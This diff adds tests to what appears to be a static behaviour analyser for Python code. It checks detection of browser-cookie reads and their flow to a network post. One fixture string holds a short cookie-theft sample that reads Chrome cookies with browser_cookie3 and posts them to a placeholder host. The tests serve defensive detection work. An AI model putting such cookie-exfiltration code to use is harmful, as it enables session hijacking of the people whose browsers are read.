@@ -477,3 +477,58 @@ runner("value = 1")
 """
     result = PythonExtractor().analyze_source(source, "starred.py")
     assert "DYNAMIC_EXEC" not in [event.op for event in result.events]
+
+
+def test_browser_cookie_flow_to_network_is_causal_session_transfer():
+    source = """
+import browser_cookie3
+import requests
+cookies = browser_cookie3.chrome(domain_name="example.com")
+requests.post("https://example.invalid", json={"cookies": str(cookies)})
+"""
+    result = PythonExtractor().analyze_source(source, "cookies.py")
+    assert "BROWSER_COOKIE_READ" in [event.op for event in result.events]
+    paths = [
+        path
+        for path in result.behavior_paths
+        if path.motif == "browser_session_transfer"
+    ]
+    assert len(paths) == 1
+    assert paths[0].evidence_kind == "dataflow"
+    assert paths[0].confidence == "high"
+
+
+def test_unrelated_cookie_read_and_telemetry_stays_proximity_only():
+    source = """
+import browser_cookie3
+import requests
+cookies = browser_cookie3.firefox(domain_name="example.com")
+requests.post("https://example.invalid", json={"event": "startup"})
+"""
+    result = PythonExtractor().analyze_source(source, "cookies.py")
+    paths = [
+        path
+        for path in result.behavior_paths
+        if path.motif == "browser_session_transfer"
+    ]
+    assert len(paths) == 1
+    assert paths[0].evidence_kind == "proximity"
+    assert paths[0].confidence == "low"
+
+
+def test_browser_cookie_import_alias_is_resolved():
+    source = "import browser_cookie3 as bc\ncookies = bc.edge()\n"
+    result = PythonExtractor().analyze_source(source, "cookies.py")
+    events = [event for event in result.events if event.op == "BROWSER_COOKIE_READ"]
+    assert len(events) == 1
+
+
+def test_unqualified_chrome_method_is_not_a_browser_cookie_source():
+    source = """
+class Browser:
+    def chrome(self):
+        return "not cookies"
+value = Browser().chrome()
+"""
+    result = PythonExtractor().analyze_source(source, "custom.py")
+    assert "BROWSER_COOKIE_READ" not in [event.op for event in result.events]
